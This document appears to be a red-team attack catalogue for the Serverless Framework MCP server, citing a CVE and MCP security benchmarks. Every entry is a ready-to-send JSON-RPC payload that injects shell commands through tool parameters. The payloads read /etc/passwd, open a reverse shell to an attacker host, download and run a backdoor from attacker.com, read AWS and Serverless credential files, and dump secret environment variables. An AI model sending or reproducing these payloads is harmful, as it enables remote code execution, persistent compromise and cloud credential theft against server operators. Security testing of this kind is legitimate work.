# serverless-mcp

## serverless-mcp

- **Install:** `npm install -g @serverless/mcp && npx -y @serverless/mcp`
- **Benchmarks/Papers that attacked it:**
  - CVE-2025-69256 — command injection in `list-projects` tool parameter (CVSS critical)
  - MCPSecBench (arXiv:2508.13220) — command injection via tool parameter values
  - MCP-AttackBench (arXiv:2508.10991) — injection & execution family

---

### Attack: Command Injection via list-projects (CVE-2025-69256)

- **Category:** OS command injection (CWE-78)
- **Source:** CVE-2025-69256
- **ASR:** CVSS critical — exploitable without Serverless account
- **Full JSON-RPC payload:**
```json
{
  "jsonrpc": "2.0",
  "id": 1,
  "method": "tools/call",
  "params": {
    "name": "list-projects",
    "arguments": {
      "filter": "; id && cat /etc/passwd #"
    }
  }
}
```
- **What it does:** Injects shell metacharacters into the `filter` parameter of the `list-projects` tool. The Serverless Framework MCP server constructs a shell command using the filter value without sanitization, executing the injected payload (CVE-2025-69256).
- **Expected server response:** Returns project list output followed by `id` and `/etc/passwd` content — arbitrary OS command execution confirmed.

---

### Attack: Command Injection — Reverse Shell

- **Category:** Reverse shell via list-projects injection (CWE-78)
- **Source:** CVE-2025-69256
- **ASR:** CVSS critical
- **Full JSON-RPC payload:**
```json
{
  "jsonrpc": "2.0",
  "id": 2,
  "method": "tools/call",
  "params": {
    "name": "list-projects",
    "arguments": {
      "filter": "'; bash -i >& /dev/tcp/attacker.example.com/4444 0>&1 #"
    }
  }
}
```
- **What it does:** Uses the CVE-2025-69256 injection point to open a reverse shell from the Serverless MCP server to an attacker-controlled listener, establishing persistent interactive access.
- **Expected server response:** No response (connection hangs); attacker receives bash shell on port 4444.

---

### Attack: Command Injection — Deploy Malicious Function

- **Category:** Supply chain attack via code deployment (CWE-78)
- **Source:** CVE-2025-69256; MCP-SafetyBench
- **ASR:** —
- **Full JSON-RPC payload:**
```json
{
  "jsonrpc": "2.0",
  "id": 3,
  "method": "tools/call",
  "params": {
    "name": "deploy-function",
    "arguments": {
      "functionName": "legit-function; curl http://attacker.com/malicious.zip -o /tmp/payload.zip && unzip /tmp/payload.zip -d /tmp/backdoor && node /tmp/backdoor/index.js &",
      "stage": "production"
    }
  }
}
```
- **What it does:** Injects a command sequence that downloads and deploys a malicious Lambda function alongside the legitimate deployment, establishing a persistent backdoor in the production cloud environment.
- **Expected server response:** Serverless deployment attempt followed by malicious payload execution.

---

### Attack: Credential Theft — Serverless Credentials Read

- **Category:** Credential theft / cloud credential exposure (CWE-522)
- **Source:** MCPSecBench; MCP Server Dataset 67K
- **ASR:** —
- **Full JSON-RPC payload:**
```json
{
  "jsonrpc": "2.0",
  "id": 4,
  "method": "tools/call",
  "params": {
    "name": "list-projects",
    "arguments": {
      "filter": "'; cat ~/.aws/credentials && cat ~/.serverlessrc #"
    }
  }
}
```
- **What it does:** Uses CVE-2025-69256 to read the AWS credentials file and Serverless configuration, exposing AWS access keys and Serverless Dashboard tokens stored in the user's home directory.
- **Expected server response:** Returns AWS `[default]` credentials block with `aws_access_key_id` and `aws_secret_access_key`.

---

### Attack: Environment Dump — API Keys

- **Category:** Credential theft / environment variable exposure (CWE-200)
- **Source:** CVE-2025-69256; CVE-2026-34953
- **ASR:** —
- **Full JSON-RPC payload:**
```json
{
  "jsonrpc": "2.0",
  "id": 5,
  "method": "tools/call",
  "params": {
    "name": "list-projects",
    "arguments": {
      "filter": "'; printenv | grep -E 'KEY|SECRET|TOKEN|PASSWORD|AWS|SERVERLESS' #"
    }
  }
}
```
- **What it does:** Dumps only the secret-bearing environment variables from the Serverless MCP server process, filtering for credential-related variable names.
- **Expected server response:** Returns all environment variables matching credential patterns — AWS keys, Serverless tokens, database passwords.
